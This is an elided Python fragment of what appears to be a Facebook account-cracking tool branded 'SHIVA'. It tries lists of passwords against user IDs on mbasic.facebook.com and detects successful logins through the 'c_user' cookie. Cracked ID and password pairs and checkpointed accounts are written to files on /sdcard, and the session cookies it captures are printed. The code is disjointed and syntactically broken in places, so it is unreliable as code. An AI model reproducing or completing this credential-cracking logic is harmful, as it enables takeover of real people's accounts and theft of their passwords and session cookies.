...
def xerx6():
	...
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in SHIVA-OK.txt, SHIVA-CP.txt')
	print(47*"-")
...
def mbasic(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			"login":"Log In"}
			header_freefb =  {
    'datr': 'G4hUZQPgN4-OPam6PBIXKPDz',
    'sb': 'G4hUZZu_YhSXhgrK_T2KisSe',
}
...
headers = {
    ...
    # 'cookie': 'datr=G4hUZQPgN4-OPam6PBIXKPDz; sb=G4hUZZu_YhSXhgrK_T2KisSe',
    'dpr': '1.875',
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Lite Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[SHIVA-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/SHIVA-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[SHIVA-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/SHIVA-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/SHIVA-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-SHIVA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
